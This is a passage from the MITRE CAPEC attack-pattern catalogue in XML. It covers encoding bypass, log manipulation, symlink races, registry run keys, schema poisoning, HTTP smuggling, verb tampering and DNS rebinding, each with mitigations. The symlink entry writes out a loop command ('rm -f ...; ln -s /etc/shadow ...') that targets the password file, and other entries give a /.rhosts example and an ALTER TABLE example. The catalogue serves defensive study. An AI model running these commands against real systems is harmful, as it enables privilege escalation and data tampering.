         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="153"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
               <Technique>Manually inspect the application to find entry points.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</Description>
               <Technique>Try to use different encodings of content in order to bypass validation routines.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can inject different representation of a filtered character in a different encoding.</Skill>
            <Skill Level="Medium">An attacker may craft subtle encoding of input data by using the knowledge that he/she has gathered about the target host.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified "encoding strings," which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka "Post Encoding Information Disclosure Vulnerability." Related Vulnerabilities CVE-2010-0488</Example>
            <Example>Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="180"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="692"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1027</Entry_ID>
               <Entry_Name>Obfuscated Files or Information</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-108" Section="WASC-20 - Improper Input Handling"/>
            <Reference External_Reference_ID="REF-109" Section="Category: Encoding"/>
            <Reference External_Reference_ID="REF-110" Section="Canonicalization, locale and Unicode"/>
            <Reference External_Reference_ID="REF-111" Section="XSS (Cross Site Scripting) Prevention Cheat Sheet"/>
            <Reference External_Reference_ID="REF-112" Section="Chapter 5 Section 9: Character Encoding"/>
            <Reference External_Reference_ID="REF-113" Section="Character encoding"/>
            <Reference External_Reference_ID="REF-114"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="268" Name="Audit Log Manipulation" Abstraction="Standard" Status="Draft">
         <Description>The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="161"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target host is logging the action and data of the user.</Prerequisite>
            <Prerequisite>The target host insufficiently protects access to the logs or logging mechanisms.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>
               <xhtml:p>The attacker must understand how the logging mechanism works.</xhtml:p>
               <xhtml:p>Optionally, the attacker must know the location and the format of individual entries of the log files.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="117"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="27" Name="Leveraging Race Conditions via Symbolic Links" Abstraction="Detailed" Status="Draft">
         <Description>This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to her. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file she will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="26"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Verify that target host's platform supports symbolic links.] This attack pattern is only applicable on platforms that support symbolic links.</Description>
               <Technique>Research target platform to determine whether it supports symbolic links.</Technique>
               <Technique>Create a symbolic link and ensure that it works as expected on the given platform.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Examine application's file I/O behavior] Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.</Description>
               <Technique>Use kernel tracing utility such as ktrace to monitor application behavior.</Technique>
               <Technique>Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls</Technique>
               <Technique>Watch temporary directories to see when temporary files are created, modified and deleted.</Technique>
               <Technique>Analyze source code for open-source systems like Linux, Apache, etc.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Verify ability to write to filesystem] The attacker verifies ability to write to the target host's file system.</Description>
               <Technique>Create a file that does not exist in the target directory (e.g. "touch temp.txt" in UNIX-like systems)</Technique>
               <Technique>On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.</Technique>
               <Technique>Verify permissions on target directory</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Replace file with a symlink to a sensitive system file.] Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.</Description>
               <Technique>Create an infinite loop containing commands such as "rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat". Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) "rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat", and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.</Technique>
               <Technique>Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker is able to create Symlink links on the target host.</Prerequisite>
            <Prerequisite>Tainted data from the attacker is used and copied to temporary files.</Prerequisite>
            <Prerequisite>The target host does insecure temporary file creation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">This attack is sophisticated because the attacker has to overcome a few challenges such as creating symlinks on the target host during a precise timing, inserting malicious data in the temporary file and have knowledge about the temporary files created (file name and function which creates them).</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use safe libraries when creating temporary files. For instance the standard library function mkstemp can be used to safely create temporary files. For shell scripts, the system utility mktemp does the same thing.</Mitigation>
            <Mitigation>Access to the directories should be restricted as to prevent attackers from manipulating the files. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file.</Mitigation>
            <Mitigation>Follow the principle of least privilege when assigning access rights to files.</Mitigation>
            <Mitigation>Ensure good compartmentalization in the system to provide protected areas that can be trusted.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In this naive example, the Unix program foo is setuid. Its function is to retrieve information for the accounts specified by the user. For "efficiency," it sorts the requested accounts into a temporary file (/tmp/foo naturally) before making the queries.</xhtml:p>
               <xhtml:p>The directory /tmp is world-writable. Malicious user Mallory creates a symbolic link to the file /.rhosts named /tmp/foo. Then, she invokes foo with "user" as the requested account. The program creates the (temporary) file /tmp/foo (really creating /.rhosts) and puts the requested account (e.g. "user password")) in it. It removes the temporary file (merely removing the symbolic link).</xhtml:p>
               <xhtml:p>Now the /.rhosts contains + +, which is the incantation necessary to allow anyone to use rlogin to log into the computer as the superuser.</xhtml:p>
               <xhtml:p>[R.27.1]</xhtml:p>
            </Example>
            <Example>GNU "ed" utility (before 0.3) allows local users to overwrite arbitrary files via a symlink attack on temporary files, possibly in the open_sbuf function. See also: CVE-2006-6939</Example>
            <Example>OpenmosixCollector and OpenMosixView in OpenMosixView 1.5 allow local users to overwrite or delete arbitrary files via a symlink attack on (1) temporary files in the openmosixcollector directory or (2) nodes.tmp. See also: CVE-2005-0894</Example>
            <Example>Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails. See also: CVE-2000-0972</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="367"/>
            <Related_Weakness CWE_ID="61"/>
            <Related_Weakness CWE_ID="662"/>
            <Related_Weakness CWE_ID="689"/>
            <Related_Weakness CWE_ID="667"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-115" Section="Symlink race"/>
            <Reference External_Reference_ID="REF-116"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Examples-Instances</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="270" Name="Modification of Registry Run Keys" Abstraction="Detailed" Status="Stable">
         <Description>An adversary adds a new entry to the "run keys" in the registry so that an application of his choosing is executed when a user logs in. In this way, the adversary can get their executable to operate and run on the target system with the authorized user's level of permissions.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="203"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary can place a malicious executable (RAT) on the target system and then configure it to automatically run when the user logs in to maintain persistence on the target system.</Example>
            <Example>Through the modification of registry "run keys" the adversary can masquerade a malicious executable as a legitimate program.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="15"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1060</Entry_ID>
               <Entry_Name>Registry Run Keys – Start Folder</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="271" Name="Schema Poisoning" Abstraction="Standard" Status="Draft">
         <Description>An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="176"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Some level of access to modify the target schema.</Prerequisite>
            <Prerequisite>The schema used by the target application must be improperly secured against unauthorized modification and manipulation.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Impact>Resource Consumption</Impact>
               <Note>A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Protect the schema against unauthorized modification.</Mitigation>
            <Mitigation>Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.</Mitigation>
            <Mitigation>Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">{ "title": "Contact", "type": "object", "properties": { "Name": { "type": "string" }, "Phone": { "type": "string" }, "Email": { "type": "string" }, "Address": { "type": "string" } }, "required": ["Name", "Phone", "Email", "Address"] }</xhtml:div>
               <xhtml:p>If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.</xhtml:p>
            </Example>
            <Example>
               <xhtml:p>In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named "name", an adversary could make the following schema change:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">ALTER TABLE Contacts MODIFY Name VARCHAR(65353);</xhtml:div>
               <xhtml:p>The "Name" field of the "Conteacts" table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="15"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="272" Name="Protocol Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An adversary subverts a communications protocol to perform an attack. This type of attack can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The protocol or implementations thereof must contain bugs that an adversary can exploit.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="273" Name="HTTP Response Smuggling" Abstraction="Detailed" Status="Draft">
         <Description>An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="33"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted server must allow the attacker to insert content that will appear in the server's response.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Employ strict adherence to interpretations of HTTP messages wherever possible.</Mitigation>
            <Mitigation>Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="436"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-117"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="274" Name="HTTP Verb Tampering" Abstraction="Detailed" Status="Draft">
         <Description>An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted system must attempt to filter access based on the HTTP verb used in requests.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Ensure that only legitimate HTTP verbs are allowed.</Mitigation>
            <Mitigation>Design: Do not use HTTP verbs as factors in access decisions.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="654"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-118"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="275" Name="DNS Rebinding" Abstraction="Detailed" Status="Draft">
         <Description>An adversary serves content whose IP address is resolved by a DNS server that the adversary controls. After initial contact by a web browser (or similar client), the adversary changes the IP address, to which its name resolves, to an address within the target organization that is not publicly accessible. This allows the web browser to examine this internal address on behalf of the adversary. Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. In a DNS binding attack, an adversary publishes content on their own server with their own name and DNS server. The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution and provides a short Time-To-Live (TTL) in order to prevent the target from caching the value. When the target makes a subsequent request to the adversary's content, the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the adversary identifies, additional attacks are possible. This attack differs from pharming attacks in that the adversary is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="194">
               <Exclude_Related Exclude_ID="403"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify potential DNS rebinding targets] An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.</Description>
               <Technique>Adversary uses Web advertisements to attract the victim to access adversary's DNS. Explore the versions of web browser or flash players in HTTP request.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Establish initial target access to adversary DNS] The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Rebind DNS resolution to target address] The target makes a subsequent request to the adversary's content and the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine exploitability of DNS rebinding access to target address] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Access &amp; exfiltrate data within the victim's security zone] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.</Description>
               <Technique>Adversary attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.</Technique>
               <Technique>Adversary tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target browser must access content server from the adversary controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the adversary and re-resolve the adversary's DNS name after initial contact.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Setup DNS server and the adversary's web server. Write a malicious script to allow the victim to connect to the web server.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
